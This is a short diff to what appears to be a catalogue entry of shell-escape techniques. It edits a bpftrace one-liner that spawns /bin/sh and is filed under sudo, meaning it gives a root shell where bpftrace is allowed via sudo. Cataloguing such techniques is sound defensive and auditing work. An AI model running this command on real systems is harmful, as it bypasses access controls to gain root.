@@ -2,7 +2,7 @@
 functions:
   shell:
   - code: |-
-      sudo bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+      bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
     contexts:
       sudo:
   - code: |-
